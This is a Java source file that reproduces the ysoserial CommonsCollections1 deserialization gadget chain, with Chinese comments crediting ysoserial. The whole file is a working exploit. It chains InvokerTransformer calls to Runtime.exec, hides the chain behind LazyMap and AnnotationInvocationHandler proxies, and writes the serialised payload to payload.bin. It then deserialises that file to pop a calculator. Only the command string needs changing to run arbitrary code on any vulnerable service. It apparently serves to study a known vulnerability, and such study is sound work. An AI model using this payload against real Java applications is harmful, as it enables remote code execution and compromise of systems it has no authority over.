import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class Main3ysoserial {


    public static void main(String[] args) throws Exception {

        /**
         *
         * 使用动态代理方式进行反序列化，代码摘自 ysoserial,  调用get方法，触发transform
         *
         */

        final String[] execArgs = new String[]{"open /Applications/Calculator.app"};

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        Field field = transformerChain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain, transformers);




        final Map mapProxy = createProxy(createMemoizedInvocationHandler(lazyMap), Map.class);
        final InvocationHandler handler = createMemoizedInvocationHandler(mapProxy);


        // 反序列化验证
        File f = new File("payload.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(handler);
        out.flush();
        out.close();

        FileInputStream fis = new FileInputStream("payload.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        // 得到AnnotationInvocationHandler对象，并实例化
        return (InvocationHandler) ctor.newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(ClassLoader.class.getClassLoader(), allIfaces, ih));
    }

}
